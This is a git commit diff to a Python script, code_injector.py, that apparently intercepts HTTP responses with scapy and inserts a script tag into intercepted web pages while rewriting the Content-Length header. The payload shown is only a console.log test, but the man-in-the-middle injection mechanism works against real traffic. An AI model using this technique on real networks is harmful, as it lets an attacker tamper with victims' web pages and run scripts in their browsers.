68e4cfeee1caf04496dfb7b9566e8893be4f06ad
dashzou <fxfddfno@gmail.com>
2020-07-14 18:21:31 -0400

    Replace length content

--- code_injector.py
+++ code_injector.py
@@ -28,13 +28,22 @@ def process_packet(packet):
         elif scapy_packet[scapy.TCP].sport == 80:
             print("[+] Response")
             if "</body>" in str(load):
+                inj_code = "<script>console.log('test')</script>"
                 load = load.replace(
-                    "</body>", "<script>console.log('test')</script></body>")
-            content_length_search = re.search(
-                "(?:Content-Length:\s)(\d*)", load)
-            if content_length_search:
-                content_length = content_length_search.group(1)
-                print(content_length)
+                    "<script src='js/main.js'></script>", inj_code + " <script src='js/main.js'></script> ")
+                content_length_search = re.search(
+                    "(?:Content-Length:\s)(\d*)", load)
+                if content_length_search:
+                    content_length = content_length_search.group(1)
+                    print(content_length)
+                    new_content_length = int(
+                        content_length) + len(inj_code) + 1000
+
+                    print(load)
+                    load = load.replace(
+                        content_length, str(new_content_length))
+                    print(load)
+
         if load != scapy_packet[scapy.Raw].load:
             new_packet = set_load(scapy_packet, load)
             packet.set_payload(str(new_packet))
